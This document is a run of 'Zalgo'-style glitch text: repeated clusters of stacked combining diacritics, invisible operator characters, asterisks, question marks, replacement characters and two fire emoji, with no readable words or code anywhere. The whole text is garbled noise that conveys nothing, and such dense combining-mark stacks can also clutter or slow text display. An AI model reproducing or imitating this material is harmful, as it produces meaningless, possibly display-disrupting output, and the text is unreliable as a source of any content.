̧͍̦̟͈̤⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵